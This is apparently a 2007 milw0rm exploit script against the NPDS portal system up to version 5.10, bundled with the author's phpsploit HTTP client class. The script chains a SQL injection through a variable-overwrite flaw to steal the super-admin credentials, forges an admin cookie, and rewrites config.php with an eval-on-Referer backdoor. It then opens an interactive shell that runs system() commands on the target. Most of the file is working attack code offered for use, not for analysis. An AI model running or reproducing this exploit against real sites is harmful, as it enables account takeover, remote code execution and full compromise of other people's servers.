#!/usr/bin/php
<?php
error_reporting(E_ALL ^ E_NOTICE);

# Advisory soon
if($argc < 3)
{
print("
  TITLE | Net Portal Dynamic System (NPDS) <= 5.10 Remote Code Execution 0day
 AUTHOR | DarkFig \/ http://www.acid-root.new.fr \/ gmdarkfig@gmail.com
   NOTE | Works regardless of php settings
  USAGE | $argv[0] -url <url> [Options]
OPTIONS | -proxy     If you wanna use a proxy <proxyhost:proxyport> 
        | -proxyauth Basic authentification <proxyuser:proxypwd>
");exit(1);
}

$url = getparam('url',1);
$pro = getparam('proxy');
$pra = getparam('proyauth');

$xpl = new phpsploit();
$xpl->agent('Mozilla Firefox');
if($pro) $xpl->proxy($pro);
if($pra) $xpl->proxyauth($pra);


# +print.php (SQL INJECTION)
# |
# 124. } elseif (!empty($lid)) {
# 125.  settype ($lid, "integer");
# 126.  PrintPage("links",$DB, $lid);
# 
# 30.  if ($oper=="links") {
# 31.  $result=mysql_query("select url, title, description, date from ".$DB."links_links where lid='$sid'");
# 32.  list($url, $title, $description, $time)=mysql_fetch_row($result);
# 40.  if ($DB) {
# 41.  $remp=meta_lang(aff_code(aff_langue(ob_get_contents())));
#
$aid = 'CONCAT(CHAR(66,69,71,73,78,85,83,82),(SELECT%20aid%20FROM%20authors%20WHERE%20radminsuper=1),CHAR(69,78,68,85,83,82))';
$pwd = 'CONCAT(CHAR(66,69,71,73,78,80,87,68),(SELECT%20pwd%20FROM%20authors%20WHERE%20radminsuper=1),CHAR(69,78,68,80,87,68))';


# +grab_globals.php (VARS OVERWRITE / "url_protect" FILTER EVASION)
# |
# 78.  if (!empty($_GET)) {
# 79.  if (!$magicquotesGPC)
# 80.  array_walk($_GET,'addslashes_GPC');
# 81.  reset($_GET);
# 82.  array_walk($_GET,'url_protect');
# 83.  extract($_GET, EXTR_OVERWRITE);
#       
# 106. if (!empty($_COOKIE)) {
# 107. if (!$magicquotesGPC)
# 108. array_walk($_COOKIE,'addslashes_GPC');
# 109. reset($_COOKIE);
# 110. array_walk($_COOKIE,'url_protect');
# 111. extract($_COOKIE, EXTR_OVERWRITE);
#       
# 132. if (!empty($_FILES)) {
# 133. while (list($key,$value)=each($_FILES)) {
# 134. $$key=$value['tmp_name'];
# 135. }
#
$xpl->get($url."print.php?_FILES[DB][tmp_name]=links_links%20union%20select%20-1,$aid,$pwd,1%20ORDER%20BY%20url%23&lid=1");

if (preg_match("#BEGINUSR(.*)ENDUSR#",$xpl->getcontent(),$aid)
AND preg_match("#BEGINPWD(.*)ENDPWD#",$xpl->getcontent(),$pwd))
print "\nAdmin_aid: $aid[1]\nAdmin_pwd: $pwd[1]";
else die("Exploit failed");

# +auth.inc.php (ADMIN AUTH)
# |
# 59. if ($admin!="") {
# 60.  $Xadmin = base64_decode($admin);
# 61.  $Xadmin = explode(":", $Xadmin);
# 62.  $aid = urlencode($Xadmin[0]);
# 63.  $AIpwd = $Xadmin[1];
# 64.  if ($aid=="" or $AIpwd=="") {
# 65.     Admin_Alert("Null Aid or Passwd");
# 66.  }
# 67. $result=mysql_query("select pwd, radminsuper from authors where aid='$aid'");
# 68. if (!$result) {
# 69.     Admin_Alert("DB not ready #2 : $aid / $AIpwd | ");
# 70.  } else {
# 71.    list($AIpass, $Xsuper_admintest)=mysql_fetch_row($result);
# 72.    if (md5($AIpass) == $AIpwd and $AIpass != "") {
# 73.       $admintest = true;
# 74.       $super_admintest = $Xsuper_admintest;
# 75.    } else {
# 76.       Admin_Alert("Password in Cookies not Good #1 : $aid / $AIpwd | ");
# 77.    }
# 78.  }
# 79.  unset ($AIpass);
# 80.  unset ($AIpwd);
# 81.  unset ($Xadmin);
# 82.  unset ($Xsuper_admintest);
# 83. }
#
$cok = urlencode(base64_encode($aid[1].':'.md5($pwd[1])));
$xpl->addcookie('admin',$cok);
print "\nAdmin_cookie: admin=$cok\n\$shell> ";


# +admin/settings.php (CODE EXECUTION)
# |
# 758. switch($op) {
# 763. case "ConfigSave":
# 764. include("admin/settings_save.php");
# 765. ConfigSave($xparse,$xsitename,$xnuke_url,$xsite_logo,$xslogan,$xstartdate,$xadminmail,
#      $xtop,$xstoryhome,$xoldnum,$xultramode,$xanonpost,$xDefault_Theme,$xbanners,$xmyIP,
#      $xfoot1,$xfoot2,$xfoot3,$xfoot4,$xbackend_title,$xbackend_language,$xbackend_image,
#      $xbackend_width,$xbackend_height,$xlanguage,$xlocale,$xperpage,$xpopular,$xnewlinks,
#      $xtoplinks,$xlinksresults,$xlinks_anonaddlinklock,$xnotify,$xnotify_email,$xnotify_subject,
#      $xnotify_message,$xnotify_from,$xmoderate,$xcommentlimit,$xanonymous,$xmaxOptions,$xBarScale,
#      $xsetCookies,$xtipath,$xuserimg,$xadminimg,$xadmingraphic,$xsite_font,$xadmart,$xminpass,
#      $xhttpref,$xhttprefmax,$xpollcomm,$xlinkmainlogo,$xstart_page,$xsmilies,$xOnCatNewLink,
#      $xEmailFooter,$xshort_user,$xgzhandler,$xrss_host_verif,$xcache_verif,$xmember_list,
#      $xdownload_cat,$xmod_admin_news,$xgmt,$xAutoRegUser,$xTitlesitename,$xfilemanager,
#      $xshort_review,$xnot_admin_count,$xadmin_cook_duration,$xuser_cook_duration,$xtroll_limit,
#      $xsubscribe,$xCloseRegUser,$xshort_menu_admin,$xmail_fonction,$xmemberpass,$xshow_user,
#      $xdns_verif,$xmember_invisible,$xavatar_size,$xlever,$xcoucher,$xmulti_langue,$xadmf_ext,
#      $xsavemysql_size,$xsavemysql_mode,$xtiny_mce);
# 766. break;
# 767. }
#
# +admin/settings_save.php
# |
# 142. function ConfigSave(...
# 212. $file = fopen("config.php","w");
# 401. $content .= "\$perpage = $xperpage;\n";
# 402. $content .= "\$popular = $xpopular;\n";...
# 614. fwrite($file, $content);
# 615. fclose($file);
#
$PHPCODE = 'if(isset($_SERVER[HTTP_REFERER])) eval($_SERVER[HTTP_REFERER])';


# Default config value
# You can get the config here ./admin.php?op=Configure
#
$config = array(
frmdt_url => $url.'admin.php',"xparse" => "1","xgzhandler" => "0","xfilemanager" => "0","xadmin_cook_duration" => "240",
"xuser_cook_duration" => "8000","xsitename" => "NPDS SABLE","xTitlesitename" => "NPDS - générateur de portail Php / Mysql en Open Source",
"xnuke_url" => "http://www.npds.org","xsite_logo" => "themes/Permanent-Double-Side/images/npds_p.gif","xslogan" => "NPDS SABLE",
"xstartdate" => "01/10/2005","xtop" => "10;$PHPCODE","xstoryhome" => "10","xoldnum" => "10","xultramode" => "1","xanonymous" => "Anonyme",
"xanonpost" => "0","xtroll_limit" => "6","xmod_admin_news" => "0","xnot_admin_count" => "1","xDefault_Theme" => "Permanent-Double-Side",
"xstart_page" => "index.php?op=edito","xlanguage" => "french","xmulti_langue" => "false","xlocale" => "french","xlever" => "08:00",
"xcoucher" => "20:00","xgmt" => "","xbanners" => "0","xmyIP" => "1.1.1.100","xfoot4" => "","xbackend_title" => "NPDS","xbackend_language" => "fr-FR",
"xfoot1" => "Tous les Logos et Marques sont déposés, les commentaires sont sous la responsabilité de ceux qui les ont publiés, le reste @ npds.org",
"xfoot2" => "Ce site a été construit avec <a href=http://www.npds.org CLASS=NOIR>NPDS</a>, un système de portail écrit en PHP. Ce logiciel est sous <a href=http://www.gnu.org CLASS=NOIR>GNU/GPL license</a>.",
"xfoot3" => "syndication de vos News via <a href=http://www.votre_site/backend.php CLASS=NOIR>www.votre_site/backend.php</a> -::- + encore via le NPDS Push Infos System",
"xbackend_image" => "","xbackend_width" => "88","xbackend_height" => "31","xperpage" => "10","xpopular" => "10","xnewlinks" => "10",
"xtoplinks" => "10","xlinksresults" => "10","xlinks_anonaddlinklock" => "0","xlinkmainlogo" => "0","xOnCatNewLink" => "1",
"xadminmail" => "","xmail_fonction" => "1","xEmailFooter" => "","xnotify" => "0","xnotify_email" => "membre@site.fr","xnotify_subject" => "Nouvelle soumission",
"xnotify_message" => "Le site a recu une nouvelle soumission !","xnotify_from" => "webmaster","xmoderate" => "1","xcommentlimit" => "4096",
"xmaxOptions" => "12","xBarScale" => "1","xsetCookies" => "1","xpollcomm" => "1","xtipath" => "themes/Permanent-Double-Side/images/topics/",
"xuserimg" => "/themes/Permanent-Double-Side/images/menu/","xadminimg" => "images/admin/","xadmingraphic" => "0","xadmf_ext" => "gif",
"xshort_menu_admin" => "1","xsite_font" => "Verdana, Arial, Helvetica","xadmart" => "10","xminpass" => "5","xshow_user" => "20","xsmilies" => "1",
"xavatar_size" => "60*80","xshort_user" => "0","xAutoRegUser" => "1","xmemberpass" => "1","xsubscribe" => "1","xmember_invisible" => "0",
"xCloseRegUser" => "0","xhttpref" => "1","xhttprefmax" => "1000","xmember_list" => "0","xdownload_cat" => "Tous","xshort_review" => "0",
"xrss_host_verif" => "false","xcache_verif" => "true","xdns_verif" => "false","xsavemysql_size" => "256","xsavemysql_mode" => "1",
"xtiny_mce" => "true","op" => "ConfigSave");

# 0_o my website has been reset
#
$xpl->formdata($config);

while(!preg_match("#^(quit|exit)$#",($cmd = trim(fgets(STDIN)))))  # $cmd -> );print($dbpass);//
{
    $xpl->addheader("Referer","@system($cmd);die;");
    $xpl->get($url.'config.php');
    print $xpl->getcontent()."\n\$shell> ";
}

function getparam($param,$opt='')
{
	global $argv;
	foreach($argv as $value => $key)
	{
		if($key == '-'.$param) return $argv[$value+1];
	}
	if($opt) exit("\n-$param parameter required");
	else return;
}

/*
 * 
 * Copyright (C) darkfig
 * 
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * 
 * TITLE:          PhpSploit Class
 * REQUIREMENTS:   PHP 5 (remove "private", "public" if you have PHP 4)
 * VERSION:        1.2
 * LICENSE:        GNU General Public License
 * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt
 * FILENAME:       phpsploitclass.php
 *
 * CONTACT:        gmdarkfig@gmail.com (french / english)
 * GREETZ:         Sparah, Ddx39
 *
 * DESCRIPTION:
 * The phpsploit is a class implementing a web user agent.
 * You can add cookies, headers, use a proxy server with (or without) a
 * basic authentification. It supports the GET and the POST method. It can
 * also be used like a browser with the cookiejar() function (which allow
 * a server to add several cookies for the next requests) and the
 * allowredirection() function (which allow the script to follow all
 * redirections sent by the server). It can return the content (or the
 * headers) of the request. Others useful functions can be used for debugging.
 * A manual is actually in development but to know how to use it, you can
 * read the comments.
 *
 * CHANGELOG:
 * [2007-01-24] (1.2)
 *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))
 *  * New: multipart/form-data enctype is now supported 
 *
 * [2006-12-31] (1.1)
 *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)
 *  * New: You can now call the getheader() / getcontent() function without parameters
 *
 * [2006-12-30] (1.0)
 *  * First version
 * 
 */

class phpsploit {

	/**
	 * This function is called by the get()/post() functions.
	 * You don't have to call it, this is the main function.
	 *
	 * @return $server_response
	 */
	private function sock()
	{
		if(!empty($this->proxyhost) && !empty($this->proxyport)) $socket = fsockopen($this->proxyhost,$this->proxyport);
		else $socket = fsockopen($this->host,$this->port);
		
		if(!$socket) die("Error: The host doesn't exist");
		
		if($this->method==="get") $this->packet = "GET ".$this->url." HTTP/1.1\r\n";
		elseif($this->method==="post" or $this->method==="formdata") $this->packet = "POST ".$this->url. " HTTP/1.1\r\n";
		else die("Error: Invalid method");
		
		if(!empty($this->proxyuser)) $this->packet .= "Proxy-Authorization: Basic ".base64_encode($this->proxyuser.":".$this->proxypass)."\r\n";
		$this->packet .= "Host: ".$this->host."\r\n";
		
		if(!empty($this->agent))  $this->packet .= "User-Agent: ".$this->agent."\r\n";
		if(!empty($this->header)) $this->packet .= $this->header."\r\n";
		if(!empty($this->cookie)) $this->packet .= "Cookie: ".$this->cookie."\r\n";
		
		$this->packet .= "Connection: Close\r\n";
		if($this->method==="post")
		{
			$this->packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
			$this->packet .= "Content-Length: ".strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data."\r\n";
		}
		elseif($this->method==="formdata")
		{
			$this->packet .= "Content-Type: multipart/form-data; boundary=---------------------------".$this->boundary."\r\n";
			$this->packet .= "Content-Length: ".strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data;
		}
		$this->packet .= "\r\n";
		$this->recv = '';
		
		fputs($socket,$this->packet);
		while(!feof($socket)) $this->recv .= fgets($socket);
		fclose($socket);
		
		if($this->cookiejar) $this->cookiejar($this->getheader($this->recv));
		if($this->allowredirection) return $this->allowredirection($this->recv);
		else return $this->recv;
	}
	

	/**
	 * This function allows you to add several cookie in the
	 * request. Several methods are supported:
	 * 
	 * $this->addcookie("name","value");
	 * or
	 * $this->addcookie("name=newvalue");
	 * or
	 * $this->addcookie("othername=overvalue; xx=zz; y=u");
	 * 
	 * @param string $cookiename
	 * @param string $cookievalue
	 * 
	 */
	public function addcookie($cookn,$cookv='')
	{
		// $this->addcookie("name","value"); work avec replace
		if(!empty($cookv))
		{
			if($cookv === "deleted") $cookv=''; // cookiejar(1) && Set-Cookie: name=delete
			if(!empty($this->cookie))
			{
			    if(preg_match("/$cookn=/",$this->cookie))
			    {
			    	$this->cookie = preg_replace("/$cookn=(\S*);/","$cookn=$cookv;",$this->cookie);
			    }
			    else
			    {
			    	$this->cookie .= " ".$cookn."=".$cookv.";"; // " ".
			    }
			}
			else
			{
				$this->cookie = $cookn."=".$cookv.";";
			}
		}
		// $this->addcookie("name=value; othername=othervalue");
		else
		{
	    	 if(!empty($this->cookie))
	    	 {
	    	 	$cookn = preg_replace("/(.*);$/","$1",$cookn);
	    	 	$cookarr = explode(";",str_replace(" ", "",$cookn));
	    	 	for($i=0;$i<count($cookarr);$i++)
	    	 	{
	    	 		preg_match("/(\S*)=(\S*)/",$cookarr[$i],$matches);
	    	 		$cookn = $matches[1];
	    	 		$cookv = $matches[2];
	    	 		$this->addcookie($cookn,$cookv);
	    	 	}
	    	 }
			 else
			 {
			 	$cookn = ((substr($cookn,(strlen($cookn)-1),1))===";") ? $cookn : $cookn.";";
			 	$this->cookie = $cookn;			
			 }
		}
	}
	
	
	/**
	 * This function allows you to add several headers in the
	 * request. Several methods are supported:
	 *
	 * $this->addheader("headername","headervalue");
	 * or
	 * $this->addheader("headername: headervalue");
	 *
	 * @param string $headername
	 * @param string $headervalue
	 */
	public function addheader($headern,$headervalue='')
	{
		// $this->addheader("name","value");
		if(!empty($headervalue))
		{
			if(!empty($this->header))
			{
				if(preg_match("/$headern:/",$this->header))
				{
					$this->header = preg_replace("/$headern: (\S*)/","$headern: $headervalue",$this->header);
				}
				else
				{
					$this->header .= "\r\n".$headern.": ".$headervalue;
				}
			}
			else
			{
				$this->header=$headern.": ".$headervalue;
			}
		}
		// $this->addheader("name: value");
		else 
		{
			if(!empty($this->header))
			{
				$headarr = explode(": ",$headern);
				$headern = $headarr[0];
				$headerv = $headarr[1];
				$this->addheader($headern,$headerv);
			}
			else
			{
				$this->header=$headern;
			}
		}
	}
	

	/**
	 * This function allows you to use an http proxy server.
	 * Several methods are supported:
	 * 
	 * $this->proxy("proxyip","8118");
	 * or
	 * $this->proxy("proxyip:8118")
	 *
	 * @param string $proxyhost
	 * @param integer $proxyport
	 */
	public function proxy($proxy,$proxyp='')
	{
		// $this->proxy("localhost:8118");
		if(empty($proxyp))
		{
			preg_match("/^(\S*):(\d+)$/",$proxy,$proxarr);
			$proxh = $proxarr[1];
			$proxp = $proxarr[2];
			$this->proxyhost=$proxh;
			$this->proxyport=$proxp;
		}
		// $this->proxy("localhost",8118);
		else 
		{
			$this->proxyhost=$proxy;
			$this->proxyport=intval($proxyp);
		}
		if($this->proxyport > 65535) die("Error: Invalid port number");
	}
	

	/**
	 * This function allows you to use an http proxy server
	 * which requires a basic authentification. Several
	 * methods are supported:
	 * 
	 * $this->proxyauth("darkfig","dapasswd");
	 * or
	 * $this->proxyauth("darkfig:dapasswd");
	 *
	 * @param string $proxyuser
	 * @param string $proxypass
	 */
	public function proxyauth($proxyauth,$proxypasse='')
	{
		// $this->proxyauth("darkfig:password");
		if(empty($proxypasse))
		{
			preg_match("/^(.*):(.*)$/",$proxyauth,$proxautharr);
			$proxu = $proxautharr[1];
			$proxp = $proxautharr[2];
			$this->proxyuser=$proxu;
			$this->proxypass=$proxp;
		}
		// $this->proxyauth("darkfig","password");
		else
		{
			$this->proxyuser=$proxyauth;
			$this->proxypass=$proxypasse;
		}
	}

	
	/**
	 * This function allows you to set the "User-Agent" header.
	 * Several methods are possible to do that:
	 * 
	 * $this->agent("Mozilla Firefox");
	 * or
	 * $this->addheader("User-Agent: Mozilla Firefox");
	 * or
	 * $this->addheader("User-Agent","Mozilla Firefox");
	 * 
	 * @param string $useragent
	 */
	public function agent($useragent)
	{
		$this->agent=$useragent;
	}

	
	/**
	 * This function returns the header which will be
	 * in the next request.
	 * 
	 * $this->showheader();
	 *
	 * @return $header
	 */
	public function showheader()
	{
		return $this->header;
	}

	
	/**
	 * This function returns the cookie which will be
	 * in the next request.
	 * 
	 * $this->showcookie();
	 *
	 * @return $storedcookies
	 */
	public function showcookie()
	{
		return $this->cookie;
	}

	
	/**
	 * This function returns the last formed
	 * http request (the http packet).
	 * 
	 * $this->showlastrequest();
	 * 
	 * @return $last_http_request
	 */
	public function showlastrequest()
	{
		return $this->packet;
	}
	
	
	/**
	 * This function sends the formed http packet with the
	 * GET method. You can precise the port of the host.
	 * 
	 * $this->get("http://localhost");
	 * $this->get("http://localhost:888/xd/tst.php");
	 * 
	 * @param string $urlwithpath
	 * @return $server_response
	 */
	public function get($url)
	{
		$this->target($url);
		$this->method="get";
		return $this->sock();
	}

	
	/**
	 * This function sends the formed http packet with the
	 * POST method. You can precise the port of the host.
	 * 
	 * $this->post("http://localhost/index.php","admin=1&user=dark");
	 *
	 * @param string $urlwithpath
	 * @param string $postdata
	 * @return $server_response
	 */	
	public function post($url,$data)
	{
		$this->target($url);
		$this->method="post";
		$this->data=$data;
		return $this->sock();
	}
	

	/**
	 * This function sends the formed http packet with the
	 * POST method using the multipart/form-data enctype. 
	 * 
	 * $array = array(
	 *          frmdt_url      => "http://localhost/upload.php",
	 *          frmdt_boundary => "123456",                    # Optional
	 *                 "email" => "me@u.com",
	 *               "varname" => array(
	 *                            frmdt_type => "image/gif",   # Optional
	 *                       frmdt_transfert => "binary",      # Optional
	 *                        frmdt_filename => "hello.php",
	 *                         frmdt_content => "<?php echo ':)'; ?>"));
	 * $this->formdata($array);
	 *
	 * @param array $array
	 * @return $server_response
	 */
	public function formdata($array)
	{
		$this->target($array[frmdt_url]);
		$this->method="formdata";
		$this->data='';
		if(!isset($array[frmdt_boundary])) $this->boundary="phpsploit";
		else $this->boundary=$array[frmdt_boundary];
		foreach($array as $key => $value)
		{
			if(!preg_match("#^frmdt_(boundary|url)#",$key))
			{
				$this->data .= "-----------------------------".$this->boundary."\r\n";
				$this->data .= "Content-Disposition: form-data; name=\"".$key."\";";
				if(!is_array($value))
				{
					$this->data .= "\r\n\r\n".$value."\r\n";
				}
				else
				{
					$this->data .= " filename=\"".$array[$key][frmdt_filename]."\";\r\n";
					if(isset($array[$key][frmdt_type])) $this->data .= "Content-Type: ".$array[$key][frmdt_type]."\r\n";
					if(isset($array[$key][frmdt_transfert])) $this->data .= "Content-Transfer-Encoding: ".$array[$key][frmdt_transfert]."\r\n";
					$this->data .= "\r\n".$array[$key][frmdt_content]."\r\n";
				}
			}
		}
		$this->data .= "-----------------------------".$this->boundary."--\r\n";
		return $this->sock();
	}

	
	/**
	 * This function returns the content of the server response
	 * without the headers.
	 * 
	 * $this->getcontent($this->get("http://localhost/"));
	 * or
	 * $this->getcontent();
	 *
	 * @param string $server_response
	 * @return $onlythecontent
	 */
	public function getcontent($code='')
	{
		if(empty($code)) $code = $this->recv;
		$content = explode("\n",$code);
		$onlycode = '';
		for($i=1;$i<count($content);$i++)
		{
			if(!preg_match("/^(\S*):/",$content[$i])) $ok = 1;
			if($ok) $onlycode .= $content[$i]."\n";
		}
		return $onlycode;
	}

	
	/**
	 * This function returns the headers of the server response
	 * without the content.
	 * 
	 * $this->getheader($this->post("http://localhost/x.php","x=1&z=2"));
	 * or
	 * $this->getheader();
	 *
	 * @param string $server_response
	 * @return $onlytheheaders
	 */
	public function getheader($code='')
	{
		if(empty($code)) $code = $this->recv;
		$header = explode("\n",$code);
		$onlyheader = $header[0]."\n";
		for($i=1;$i<count($header);$i++)
		{
			if(!preg_match("/^(\S*):/",$header[$i])) break;
			$onlyheader .= $header[$i]."\n";
		}
		return $onlyheader;
	}

	
	/**
	 * This function is called by the cookiejar() function.
	 * It adds the value of the "Set-Cookie" header in the "Cookie"
	 * header for the next request. You don't have to call it.
	 * 
	 * @param string $server_response
	 */
	private function getcookie($code)
	{
		$carr = explode("\n",str_replace("\r\n","\n",$code));
		for($z=0;$z<count($carr);$z++)
		{
			if(preg_match("/set-cookie: (.*)/i",$carr[$z],$cookarr))
			{
				$cookie[] = preg_replace("/expires=(.*)(GMT||UTC)(\S*)$/i","",preg_replace("/path=(.*)/i","",$cookarr[1]));
			}
		}

		for($i=0;$i<count($cookie);$i++)
		{
			preg_match("/(\S*)=(\S*)(|;)/",$cookie[$i],$matches);
	    	        $cookn = $matches[1];
	    	        $cookv = $matches[2];
	    	        $this->addcookie($cookn,$cookv);
		}
    }

	
	/**
	 * This function is called by the get()/post() functions.
	 * You don't have to call it.
	 *
	 * @param string $urltarg
	 */
	private function target($urltarg)
	{
		if(!preg_match("/^http:\/\/(.*)\//",$urltarg)) $urltarg .= "/";
		$this->url=$urltarg;
		
		$array = explode("/",str_replace("http://","",preg_replace("/:(\d+)/","",$urltarg)));
		$this->host=$array[0];

		preg_match("/:(\d+)\//",$urltarg,$matches);
		$this->port=empty($matches[1]) ? 80 : $matches[1];
		
		$temp = str_replace("http://","",preg_replace("/:(\d+)/","",$urltarg));
		preg_match("/\/(.*)\//",$temp,$matches);
		$this->path=str_replace("//","/","/".$matches[1]."/");
	
		if($this->port > 65535) die("Error: Invalid port number");
	}
	
	
	/**
	 * If you call this function, the script will
	 * extract all "Set-Cookie" headers values
	 * and it will automatically add them into the "Cookie" header
	 * for all next requests.
	 *
	 * $this->cookiejar(1); // enabled
	 * $this->cookiejar(0); // disabled
	 * 
	 */
	public function cookiejar($code)
	{
		if($code===0) $this->cookiejar='';
		if($code===1) $this->cookiejar=1;
		else
		{
			$this->getcookie($code);
		}
	}


	/**
	 * If you call this function, the script will
	 * follow all redirections sent by the server.
	 * 
	 * $this->allowredirection(1); // enabled
	 * $this->allowredirection(0); // disabled
	 * 
	 * @return $this->get($locationresponse)
	 */
	public function allowredirection($code)
	{
		if($code===0) $this->allowredirection='';
		if($code===1) $this->allowredirection=1;
		else
		{
			if(preg_match("/(location|content-location|uri): (.*)/i",$code,$codearr))
			{
				$location = str_replace(chr(13),'',$codearr[2]);
				if(!eregi("://",$location))
				{
					return $this->get("http://".$this->host.$this->path.$location);
				}
				else
				{
					return $this->get($location);
				}
			}
			else
			{
				return $code;
			}
		}
	}
	
	
	/**
	 * This function allows you to reset some parameters:
	 * 
	 * $this->reset(header); // headers cleaned
	 * $this->reset(cookie); // cookies cleaned
	 * $this->reset();       // clean all parameters
	 *
	 * @param string $func
	 */
	public function reset($func='')
	{
		switch($func)
		{
			case "header":
			$this->header='';
			break;
			
			case "cookie":
			$this->cookie='';
			break;
			
			default:
		        $this->cookiejar='';
		        $this->header='';
		        $this->cookie='';
		        $this->allowredirection=''; 
		        $this->agent='';
		        break;
		}
	}
}
?>

# milw0rm.com [2007-03-18]
